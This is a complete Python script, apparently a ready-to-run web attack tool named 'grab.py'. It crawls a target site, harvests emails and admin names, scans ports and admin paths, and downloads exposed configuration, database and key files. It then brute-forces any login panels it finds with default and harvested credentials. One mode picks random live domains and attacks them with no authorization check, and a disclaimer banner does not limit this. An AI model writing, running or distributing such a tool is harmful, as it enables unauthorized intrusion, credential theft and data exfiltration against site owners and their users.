#!/usr/bin/env python3
import os
import sys
import random
import socket
import string
import requests
import re
import json
import threading
import time
from urllib.parse import urljoin, urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
import hashlib

try:
    from bs4 import BeautifulSoup
except ImportError:
    print("❌ BeautifulSoup4 not found. Installing...")
    os.system(f"{sys.executable} -m pip install beautifulsoup4 -q")
    from bs4 import BeautifulSoup

RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
MAGENTA = "\033[95m"
CYAN = "\033[96m"
RESET = "\033[0m"
BOLD = "\033[1m"

def cprint(msg, color=RESET):
    print(f"{color}{msg}{RESET}")

DOWNLOAD_ROOT = "/sdcard/Download" if os.path.exists("/sdcard") else os.path.expanduser("~/Downloads/web_recon")
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
]

MAX_PAGES = 150
MAX_REQUESTS = 10000
REQUEST_TIMEOUT = 5
PORT_SCAN_TIMEOUT = 1

COMMON_PORTS = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 3306, 3389, 5432, 5900, 8080, 8443, 9090]

COMMON_ADMIN_PATHS = [
    "/admin", "/administrator", "/login", "/user/login", "/wp-admin", 
    "/cms", "/manage", "/admin.php", "/cpanel", "/phpmyadmin",
    "/admin/login", "/backend", "/dashboard", "/controlpanel"
]

WP_PATHS = ["/wp-json/", "/wp-json/wp/v2/posts", "/wp-json/wp/v2/users"]

API_PATHS = [
    "/api/", "/api/v1/", "/api/v2/", "/graphql", "/rest/",
    "/swagger", "/swagger.json", "/openapi.json", "/docs"
]

SENSITIVE_EXTENSIONS = (
    '.sql', '.env', '.log', '.bak', '.zip', '.tar', '.gz', '.rar',
    '.htaccess', '.htpasswd', '.ini', '.conf', '.cfg', '.yml', '.yaml',
    '.xml', '.json', '.db', '.sqlite', '.key', '.pem', '.crt'
)

FRONTEND_EXTENSIONS = ('.js', '.css', '.html', '.htm', '.json', '.map', '.svg', '.png', '.jpg', '.jpeg', '.webp')
BACKEND_EXTENSIONS = ('.php', '.py', '.pl', '.rb', '.asp', '.aspx', '.jsp', '.java', '.go', '.env', '.log', '.sql')
CONFIG_EXTENSIONS = ('.env', '.yml', '.yaml', '.ini', '.conf', '.cfg', '.toml', '.properties')

PUBLIC_API_PATTERNS = {
    "Google Maps": r"maps\.googleapis\.com",
    "Google Fonts": r"fonts\.(googleapis|gstatic)\.com",
    "Facebook": r"(graph\.facebook\.com|connect\.facebook\.net)",
    "Stripe": r"js\.stripe\.com",
    "AWS": r"amazonaws\.com",
}

TLD_LIST = [".com", ".net", ".org", ".id", ".co", ".io"]

DEFAULT_USERNAMES = ["admin", "root", "user", "administrator", "test", "guest"]
DEFAULT_PASSWORDS = ["admin", "password", "123456", "root", "admin123", "qwerty"]

request_count = 0
request_lock = threading.Lock()

def increment_request():
    global request_count
    with request_lock:
        request_count += 1
        return request_count

def get_request_count():
    with request_lock:
        return request_count

def reset_request_count():
    global request_count
    with request_lock:
        request_count = 0

def get_random_user_agent():
    return random.choice(USER_AGENTS)

def load_wordlist(filepath):
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip() and not line.startswith('#')]
    except FileNotFoundError:
        cprint(f"{RED}❌ Wordlist not found: {filepath}{RESET}", RED)
        return []

def extract_admin_names(html):
    names = set()
    
    comments = re.findall(r'<!--.*?-->', html, re.DOTALL)
    for comment in comments:
        matches = re.findall(r'(?:by|author|created|managed|contact|developer)\s*[:\-]?\s*([A-Za-z0-9._-]+)', comment, re.I)
        for m in matches:
            if len(m) > 2 and not m.isdigit():
                names.add(m.lower())
    
    meta_author = re.findall(r'<meta[^>]+name=["\']author["\'][^>]+content=["\']([^"\']+)["\']', html, re.I)
    for author in meta_author:
        if '@' in author:
            user = author.split('@')[0]
            if len(user) > 2:
                names.add(user.lower())
        else:
            names.add(author.lower())
    
    text_patterns = [
        r'Contact:\s*([A-Za-z0-9._-]+)@',
        r'Managed by\s+([A-Za-z]+)',
        r'Admin:\s+([A-Za-z0-9._-]+)',
        r'Created by\s+([A-Za-z0-9._-]+)',
        r'Developer:\s+([A-Za-z0-9._-]+)',
    ]
    for pattern in text_patterns:
        matches = re.findall(pattern, html, re.I)
        for m in matches:
            if len(m) > 2 and not m.isdigit():
                names.add(m.lower())
    
    filtered = set()
    for name in names:
        if len(name) < 3 or len(name) > 20:
            continue
        if any(c in name for c in ['<', '>', '/', '\\', '"', "'", '@', '.']):
            continue
        if name in ['admin', 'user', 'root', 'test', 'guest']:
            continue
        filtered.add(name)
    
    return list(filtered)

def safe_request(method, url, **kwargs):
    if get_request_count() >= MAX_REQUESTS:
        return None
    try:
        if 'headers' not in kwargs:
            kwargs['headers'] = {}
        kwargs['headers']['User-Agent'] = get_random_user_agent()
        kwargs.setdefault('timeout', REQUEST_TIMEOUT)
        kwargs.setdefault('allow_redirects', True)
        resp = getattr(requests, method)(url, **kwargs)
        increment_request()
        return resp
    except:
        return None

def extract_links(html, base_url):
    links = set()
    try:
        soup = BeautifulSoup(html, "html.parser")
        for tag in soup.find_all(["a", "script", "link", "img", "iframe"]):
            url = tag.get("href") or tag.get("src")
            if url:
                links.add(urljoin(base_url, url))
        for ext in SENSITIVE_EXTENSIONS + FRONTEND_EXTENSIONS + BACKEND_EXTENSIONS:
            for match in re.findall(rf'["\'](/[^"\']*{re.escape(ext)})["\']', html, re.I):
                links.add(urljoin(base_url, match))
    except:
        pass
    return links

def extract_emails(html):
    pattern = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
    return set(re.findall(pattern, html))

def hunt_public_apis(html):
    found = {}
    for name, pattern in PUBLIC_API_PATTERNS.items():
        matches = re.findall(pattern, html, re.I)
        if matches:
            found[name] = len(set(matches))
    return found

def detect_technologies(html, headers):
    tech = []
    html_lower = html.lower()
    if 'server' in headers:
        tech.append(f"Server: {headers['server']}")
    if 'wp-content' in html_lower:
        tech.append("WordPress")
    if 'react' in html_lower:
        tech.append("React")
    if 'vue' in html_lower:
        tech.append("Vue.js")
    if 'nextjs' in html_lower or '_next' in html_lower:
        tech.append("Next.js")
    if 'laravel' in html_lower:
        tech.append("Laravel")
    return tech

def get_server_info(url):
    try:
        domain = urlparse(url).hostname
        ip = socket.gethostbyname(domain)
        resp = safe_request('get', f"http://ip-api.com/json/{ip}")
        if resp and resp.status_code == 200:
            data = resp.json()
            if data.get("status") == "success":
                return {
                    "ip": ip,
                    "location": f"{data.get('city', '')}, {data.get('country', '')}".strip(", "),
                    "isp": data.get("isp", "Unknown")
                }
    except:
        pass
    return {"ip": "Unknown", "location": "Unknown", "isp": "Unknown"}

def crawl_website(start_url, max_pages=MAX_PAGES):
    domain = urlparse(start_url).netloc
    visited, to_visit, all_links = set(), [start_url], set()
    cprint(f"{CYAN}🕷️  Crawling...{RESET}", CYAN)
    
    while to_visit and len(visited) < max_pages and get_request_count() < MAX_REQUESTS:
        url = to_visit.pop(0)
        if url in visited:
            continue
        resp = safe_request('get', url)
        if resp and resp.status_code == 200:
            new_links = extract_links(resp.text, start_url)
            all_links.update(new_links)
            for link in new_links:
                if urlparse(link).netloc == domain and link not in visited:
                    to_visit.append(link)
            visited.add(url)
            if len(visited) % 10 == 0:
                cprint(f"  ✓ [{len(visited)}] {url[:60]}", GREEN)
    return all_links

def analyze_links(links):
    admins, apis, files = set(), set(), set()
    for link in links:
        path = urlparse(link).path.lower()
        if any(p in path for p in COMMON_ADMIN_PATHS):
            admins.add(link)
        if any(a in path for a in API_PATHS):
            apis.add(link)
        if any(link.lower().endswith(ext) for ext in SENSITIVE_EXTENSIONS):
            files.add(link)
    return admins, apis, files

def scan_paths(base_url, paths):
    found = set()
    cprint(f"{YELLOW}🔍 Scanning paths...{RESET}", YELLOW)
    with ThreadPoolExecutor(max_workers=15) as executor:
        futures = {}
        for path in paths:
            if get_request_count() >= MAX_REQUESTS:
                break
            url = urljoin(base_url, path)
            future = executor.submit(check_url_exists, url)
            futures[future] = url
        for future in as_completed(futures):
            url = futures[future]
            if future.result():
                found.add(url)
                cprint(f"  ✓ {url}", GREEN)
    return found

def check_url_exists(url):
    resp = safe_request('head', url)
    return resp and resp.status_code < 400

def scan_ports(host, ports=COMMON_PORTS):
    open_ports = {}
    cprint(f"{YELLOW}🔌 Scanning ports...{RESET}", YELLOW)
    service_map = {
        21: "FTP", 22: "SSH", 80: "HTTP", 443: "HTTPS",
        3306: "MySQL", 8080: "HTTP-Alt"
    }
    for port in ports:
        try:
            sock = socket.socket()
            sock.settimeout(PORT_SCAN_TIMEOUT)
            if sock.connect_ex((host, port)) == 0:
                open_ports[port] = service_map.get(port, "Unknown")
                cprint(f"  ✓ Port {port} ({open_ports[port]})", GREEN)
            sock.close()
        except:
            pass
    return open_ports

def download_file(url, folder):
    try:
        os.makedirs(folder, exist_ok=True)
        name = os.path.basename(urlparse(url).path) or f"file_{hashlib.md5(url.encode()).hexdigest()[:8]}"
        name = re.sub(r'[<>:"/\\|?*]', '_', name)
        dest = os.path.join(folder, name)
        resp = safe_request('get', url, stream=True)
        if resp:
            with open(dest, 'wb') as f:
                for chunk in resp.iter_content(8192):
                    f.write(chunk)
            cprint(f"  ✅ {name}", GREEN)
            return True
    except Exception as e:
        pass
    return False

def save_links(links, folder):
    os.makedirs(folder, exist_ok=True)
    with open(os.path.join(folder, "all_links.txt"), "w") as f:
        for link in sorted(links):
            f.write(link + "\n")
    cprint(f"  📝 all_links.txt saved", CYAN)

def save_json_report(data, folder):
    os.makedirs(folder, exist_ok=True)
    with open(os.path.join(folder, "report.json"), "w") as f:
        json.dump(data, f, indent=2)
    cprint(f"  📊 report.json saved", CYAN)

def save_text_report(data, folder):
    os.makedirs(folder, exist_ok=True)
    with open(os.path.join(folder, "report.txt"), "w") as f:
        f.write("="*80 + "\nWEB RECON REPORT\n" + "="*80 + "\n\n")
        f.write(f"Target: {data['url']}\n")
        f.write(f"Timestamp: {data['timestamp']}\n")
        f.write(f"Duration: {data['scan_duration']:.2f}s\n\n")
        f.write(f"Server: {data['server']['ip']} ({data['server']['location']})\n\n")
        if data['admin']:
            f.write(f"ADMIN PANELS ({len(data['admin'])})\n" + "-"*80 + "\n")
            for a in data['admin']:
                f.write(f"  - {a}\n")
        if data['files']:
            f.write(f"\nFILES ({len(data['files'])})\n" + "-"*80 + "\n")
            for fi in data['files']:
                f.write(f"  - {fi}\n")
        if data['credentials']:
            f.write(f"\nCREDENTIALS\n" + "-"*80 + "\n")
            for url, creds in data['credentials'].items():
                f.write(f"{url}\n")
                for u, p in creds:
                    f.write(f"  - {u}:{p}\n")
    cprint(f"  📄 report.txt saved", CYAN)

def categorize_and_download_files(all_links, output_dir):
    frontend_files = []
    backend_files = []
    config_files = []
    api_endpoints = []

    for link in all_links:
        path = urlparse(link).path.lower()
        if any(api in path for api in ["/api/", "/graphql", "/swagger", "/openapi", "/rest/"]):
            api_endpoints.append(link)
        elif any(link.lower().endswith(ext) for ext in FRONTEND_EXTENSIONS):
            frontend_files.append(link)
        elif any(link.lower().endswith(ext) for ext in BACKEND_EXTENSIONS):
            backend_files.append(link)
        elif any(link.lower().endswith(ext) for ext in CONFIG_EXTENSIONS):
            config_files.append(link)

    total_files = len(frontend_files) + len(backend_files) + len(config_files)
    if total_files == 0:
        return 0

    cprint(f"\n{YELLOW}📁 Categorized Files:{RESET}", YELLOW)
    cprint(f"  Frontend: {len(frontend_files)}", CYAN)
    cprint(f"  Backend:  {len(backend_files)}", CYAN)
    cprint(f"  Config:   {len(config_files)}", CYAN)
    cprint(f"  API:      {len(api_endpoints)}", CYAN)

    if total_files > 100:
        confirm = input(f"{RED}⚠️  {total_files} files to download. Continue? [y/N]:{RESET} ")
        if confirm.lower() != 'y':
            return 0

    downloaded = 0
    categories = [
        ("frontend", frontend_files),
        ("backend", backend_files),
        ("config", config_files),
    ]

    for cat_name, files in categories:
        if not files:
            continue
        cat_dir = os.path.join(output_dir, cat_name)
        for url in files:
            if get_request_count() >= MAX_REQUESTS:
                break
            if download_file(url, cat_dir):
                downloaded += 1

    if api_endpoints:
        api_dir = os.path.join(output_dir, "api")
        os.makedirs(api_dir, exist_ok=True)
        with open(os.path.join(api_dir, "endpoints.txt"), "w") as f:
            for ep in sorted(api_endpoints):
                f.write(ep + "\n")
        cprint(f"  📝 api/endpoints.txt saved", CYAN)

    return downloaded

def brute_force_login_enhanced(url, username_list=None, password_list=None, max_attempts=None):
    usernames = username_list or DEFAULT_USERNAMES
    passwords = password_list or DEFAULT_PASSWORDS
    
    found = []
    attempts = 0
    max_attempts = max_attempts or (len(usernames) * len(passwords))
    
    cprint(f"  🔓 Brute forcing: {url}", YELLOW)
    cprint(f"     Users: {len(usernames)} | Passwords: {len(passwords)}", CYAN)
    
    try:
        baseline = safe_request('get', url)
        if not baseline:
            return found
        baseline_len = len(baseline.text)
    except:
        return found
    
    for u in usernames:
        if get_request_count() >= MAX_REQUESTS:
            cprint(f"    ⚠️  Request limit reached", YELLOW)
            break
            
        for p in passwords:
            if get_request_count() >= MAX_REQUESTS or attempts >= max_attempts:
                break
            
            attempts += 1
            
            payloads = [
                {"username": u, "password": p, "login": "Login"},
                {"user": u, "pass": p, "submit": "Login"},
                {"email": u, "password": p},
                {"log": u, "pwd": p, "wp-submit": "Log In"},
            ]
            
            for payload in payloads:
                if get_request_count() >= MAX_REQUESTS:
                    break
                
                try:
                    resp = safe_request('post', url, data=payload, allow_redirects=False)
                    
                    if not resp:
                        continue
                    
                    response_text = resp.text.lower()
                    success = False
                    
                    if resp.status_code in (301, 302, 303, 307, 308):
                        location = resp.headers.get('location', '')
                        if not any(fail in location.lower() for fail in ['login', 'error', 'denied']):
                            success = True
                    
                    if 'set-cookie' in resp.headers:
                        cookies = resp.headers.get('set-cookie', '').lower()
                        if any(s in cookies for s in ['session', 'auth', 'token', 'logged']):
                            success = True
                    
                    len_diff = abs(len(resp.text) - baseline_len)
                    if resp.status_code == 200 and len_diff > 100:
                        if any(keyword in response_text for keyword in ['dashboard', 'welcome', 'logout', 'profile']):
                            success = True
                        elif not any(fail in response_text for fail in ['login', 'error', 'failed', 'incorrect', 'invalid', 'wrong']):
                            success = True
                    
                    if resp.status_code == 200:
                        error_keywords = ['incorrect', 'invalid', 'failed', 'wrong password', 'authentication failed', 'login failed']
                        has_error = any(keyword in response_text for keyword in error_keywords)
                        if not has_error and len_diff > 50:
                            success = True
                    
                    if success:
                        found.append((u, p))
                        cprint(f"    {GREEN}✓ SUCCESS: {u}:{p}{RESET}", GREEN)
                        return found
                    
                except Exception as e:
                    continue
            
            if attempts % 20 == 0:
                progress = (attempts / max_attempts) * 100
                cprint(f"    Progress: {attempts}/{max_attempts} ({progress:.1f}%)", CYAN)
    
    if not found:
        cprint(f"    ✗ No valid credentials found", RED)
    
    return found

def brute_force_with_wordlist_custom(url, username_list, password_file=None):
    cprint(f"\n{RED}🔐 ENHANCED BRUTE FORCE (Custom Usernames){RESET}", RED)
    
    usernames = username_list
    cprint(f"  📋 Using {len(usernames)} dynamic usernames", GREEN)
    
    if password_file and os.path.exists(password_file):
        passwords = load_wordlist(password_file)
        cprint(f"  📋 Loaded {len(passwords)} passwords from {password_file}", GREEN)
    else:
        passwords = DEFAULT_PASSWORDS
        cprint(f"  📋 Using {len(passwords)} default passwords", YELLOW)
    
    if not usernames or not passwords:
        cprint(f"  {RED}❌ No usernames or passwords to test{RESET}", RED)
        return {}
    
    total_attempts = len(usernames) * len(passwords)
    cprint(f"  🎯 Total combinations: {total_attempts:,}", CYAN)
    
    if total_attempts > 1000:
        confirm = input(f"  {YELLOW}⚠️  This will try {total_attempts:,} combinations. Continue? [y/N]:{RESET} ")
        if confirm.lower() != 'y':
            return {}
    
    results = brute_force_login_enhanced(url, usernames, passwords, max_attempts=total_attempts)
    return {url: results} if results else {}

def full_scan(target_url, username_file=None, password_file=None):
    reset_request_count()
    start_time = time.time()
    parsed = urlparse(target_url)
    domain = parsed.netloc.replace(".", "_")
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    output_dir = os.path.join(DOWNLOAD_ROOT, f"{domain}_{timestamp}")
    
    cprint(f"\n{BOLD}{BLUE}{'='*80}{RESET}", BLUE)
    cprint(f"{BOLD}{BLUE}🔮 GRAB.PY - WEB RECON{RESET}", BLUE)
    cprint(f"{CYAN}🎯 {target_url}{RESET}\n")
    
    resp = safe_request('get', target_url)
    if not resp:
        cprint(f"{RED}❌ Failed{RESET}", RED)
        return None
    
    main_html = resp.text
    main_headers = dict(resp.headers)
    
    extracted_names = extract_admin_names(main_html)
    if extracted_names:
        cprint(f"{MAGENTA}👤 Admin names found: {', '.join(extracted_names)}{RESET}", MAGENTA)
    
    server_info = get_server_info(target_url)
    public_apis = hunt_public_apis(main_html)
    emails = extract_emails(main_html)
    technologies = detect_technologies(main_html, main_headers)
    
    all_links = crawl_website(target_url)
    admins, internal_apis, sensitive_files = analyze_links(all_links)
    all_paths = COMMON_ADMIN_PATHS + WP_PATHS + API_PATHS
    found_paths = scan_paths(target_url, all_paths)
    admins.update(found_paths)
    ports = scan_ports(parsed.hostname) if parsed.hostname else {}
    
    downloaded = categorize_and_download_files(all_links, output_dir)
    
    credentials = {}
    if admins:
        cprint(f"\n{RED}🔐 Testing credentials on {len(admins)} panel(s)...{RESET}", RED)
        
        for admin_url in list(admins)[:5]:
            if get_request_count() >= MAX_REQUESTS:
                break
            
            dynamic_usernames = DEFAULT_USERNAMES.copy()
            dynamic_usernames.extend(extracted_names)
            for email in emails:
                prefix = email.split('@')[0]
                if len(prefix) > 2:
                    dynamic_usernames.append(prefix.lower())
            dynamic_usernames = list(dict.fromkeys(dynamic_usernames))
            
            if username_file or password_file:
                if username_file:
                    wordlist_users = load_wordlist(username_file)
                    combined_users = dynamic_usernames + wordlist_users
                else:
                    combined_users = dynamic_usernames
                result = brute_force_with_wordlist_custom(admin_url, combined_users, password_file)
                credentials.update(result)
            else:
                creds = brute_force_login_enhanced(admin_url, username_list=dynamic_usernames)
                if creds:
                    credentials[admin_url] = creds
    
    report_data = {
        "timestamp": datetime.now().isoformat(),
        "url": target_url,
        "domain": parsed.netloc,
        "server": server_info,
        "technologies": technologies,
        "admin": list(admins),
        "internal_apis": list(internal_apis),
        "public_apis": public_apis,
        "ports": ports,
        "emails": list(emails),
        "files": list(sensitive_files),
        "files_downloaded": downloaded,
        "credentials": credentials,
        "total_links": len(all_links),
        "total_requests": get_request_count(),
        "scan_duration": time.time() - start_time,
        "output_dir": output_dir
    }
    
    save_links(all_links, output_dir)
    save_json_report(report_data, output_dir)
    save_text_report(report_data, output_dir)
    
    cprint(f"\n{BOLD}{GREEN}{'='*80}{RESET}", GREEN)
    cprint(f"{BOLD}{GREEN}✅ COMPLETE{RESET}\n", GREEN)
    cprint(f"Duration: {report_data['scan_duration']:.2f}s", YELLOW)
    cprint(f"Requests: {report_data['total_requests']}", YELLOW)
    cprint(f"Admins: {len(admins)}", YELLOW)
    cprint(f"Files: {len(sensitive_files)} ({downloaded} downloaded)", YELLOW)
    
    if credentials:
        cprint(f"\n{BOLD}{GREEN}🔓 CREDENTIALS FOUND!{RESET}", GREEN)
        for url, creds in credentials.items():
            cprint(f"\n  Panel: {url}", YELLOW)
            for u, p in creds:
                cprint(f"    ✓ {u}:{p}", GREEN)
                
    cprint(f"\n📁 {output_dir}\n", CYAN)
    return report_data

def auto_scan(max_attempts=100):
    cprint(f"\n{MAGENTA}🔄 AUTO SCAN{RESET}\n", MAGENTA)
    for i in range(1, max_attempts + 1):
        domain = gen_random_domain()
        cprint(f"[{i}] {domain}...", CYAN)
        if not is_domain_resolvable(domain):
            continue
        url = f"http://{domain}"
        resp = safe_request('head', url)
        if resp and resp.status_code < 500:
            cprint(f"\n{GREEN}✅ FOUND: {url}{RESET}\n", GREEN)
            full_scan(url)
            return True
    cprint(f"\n{RED}❌ No live domain found{RESET}", RED)
    return False

def batch_scan(filepath):
    cprint(f"\n{BLUE}📋 BATCH SCAN{RESET}\n", BLUE)
    try:
        with open(filepath) as f:
            urls = [l.strip() for l in f if l.strip().startswith('http')]
        cprint(f"Found {len(urls)} URLs\n", GREEN)
        for i, url in enumerate(urls, 1):
            cprint(f"\n[{i}/{len(urls)}] {url}", MAGENTA)
            full_scan(url)
            if get_request_count() >= MAX_REQUESTS:
                break
    except FileNotFoundError:
        cprint(f"{RED}❌ File not found{RESET}", RED)

def enum_subdomains(domain):
    cprint(f"\n{BLUE}🔍 SUBDOMAIN ENUM: {domain}{RESET}\n", BLUE)
    subs = ["www", "mail", "ftp", "admin", "api", "dev", "test", "blog"]
    found = []
    for sub in subs:
        subdomain = f"{sub}.{domain}"
        if is_domain_resolvable(subdomain):
            found.append(subdomain)
            cprint(f"  ✓ {subdomain}", GREEN)
    cprint(f"\n{GREEN}Found {len(found)} subdomains{RESET}\n", GREEN)
    return found

def gen_random_domain():
    vowels = "aeiou"
    consonants = "bcdfghjklmnpqrstvwxyz"
    length = random.randint(5, 10)
    domain = "".join(random.choice(vowels if i % 2 else consonants) for i in range(length))
    return domain + random.choice(TLD_LIST)

def is_domain_resolvable(domain):
    try:
        socket.gethostbyname(domain)
        return True
    except:
        return False

def print_banner():
    print(f"""{CYAN}
⚠️ WARNING & USE AT YOUR OWN RISK
Web‑reconn is for research and authorized testing only. Run this tool only against systems you own or have explicit written permission to test. Using this tool to access, extract, or damage systems without permission is illegal.

THE DEVELOPER IS NOT LIABLE for illegal use or damage caused by users. By running this tool in non‑passive mode you accept full legal responsibility for your actions and consequences.
{RESET}""")

def main():
    print_banner()
    
    use_wordlist = input(f"{CYAN}Use custom wordlist? [y/N]:{RESET} ").strip().lower()
    username_file = None
    password_file = None
    
    if use_wordlist == 'y':
        username_file = input(f"{CYAN}Username wordlist path (Enter to skip):{RESET} ").strip() or None
        password_file = input(f"{CYAN}Password wordlist path (Enter to skip):{RESET} ").strip() or None

    while True:
        try:
            print(f"\n{YELLOW}MODES:{RESET}")
            print(f"  {GREEN}1.{RESET} Single Target")
            print(f"  {GREEN}2.{RESET} Auto Random")
            print(f"  {GREEN}3.{RESET} Batch Scan")
            print(f"  {GREEN}4.{RESET} Subdomain Enum")
            print(f"  {GREEN}5.{RESET} Brute Force Only")
            print(f"  {GREEN}0.{RESET} Exit\n")
            
            choice = input(f"{CYAN}Select [1-5, 0]:{RESET} ").strip()
            
            if choice == "1":
                url = input(f"\n{CYAN}URL:{RESET} ").strip()
                if url:
                    if not url.startswith('http'):
                        url = 'http://' + url
                    full_scan(url, username_file, password_file)
            
            elif choice == "2":
                auto_scan(100)
            
            elif choice == "3":
                path = input(f"\n{CYAN}File path:{RESET} ").strip()
                if path and os.path.exists(path):
                    batch_scan(path)
            
            elif choice == "4":
                domain = input(f"\n{CYAN}Domain:{RESET} ").strip()
                if domain:
                    domain = domain.replace('http://', '').replace('https://', '').split('/')[0]
                    enum_subdomains(domain)
            
            elif choice == "5":
                url = input(f"\n{CYAN}Admin panel URL:{RESET} ").strip()
                if url:
                    if not url.startswith('http'):
                        url = 'http://' + url
                    
                    user_file = input(f"{CYAN}Username wordlist (default: built-in):{RESET} ").strip() or None
                    pass_file = input(f"{CYAN}Password wordlist (default: built-in):{RESET} ").strip() or None
                    
                    try:
                        resp = safe_request('get', url)
                        if resp:
                            extracted = extract_admin_names(resp.text)
                            emails = extract_emails(resp.text)
                            usernames = DEFAULT_USERNAMES + extracted
                            for e in emails:
                                usernames.append(e.split('@')[0])
                            usernames = list(dict.fromkeys(usernames))
                            result = brute_force_with_wordlist_custom(url, usernames, pass_file)
                        else:
                            result = brute_force_with_wordlist_custom(url, DEFAULT_USERNAMES, pass_file)
                    except:
                        result = brute_force_with_wordlist_custom(url, DEFAULT_USERNAMES, pass_file)
                    
                    if result:
                        cprint(f"\n{GREEN}Success!{RESET}", GREEN)
                        for panel_url, creds in result.items():
                            for u, p in creds:
                                cprint(f"  ✓ {u}:{p}", GREEN)
                    else:
                        cprint(f"\n{RED}No valid credentials found{RESET}", RED)
            
            elif choice == "0":
                cprint(f"\n{GREEN}Goodbye!{RESET}\n", GREEN)
                break
            
            input(f"\n{CYAN}Press Enter to continue...{RESET}")
        except KeyboardInterrupt:
            cprint(f"\n{YELLOW}Interrupted{RESET}\n", YELLOW)
            break

if __name__ == "__main__":
    try:
        if len(sys.argv) > 1:
            target = sys.argv[1]
            if not target.startswith('http'):
                target = 'http://' + target
            full_scan(target)
        else:
            main()
    except KeyboardInterrupt:
        cprint(f"\n{YELLOW}Interrupted{RESET}\n", YELLOW)
        sys.exit(0)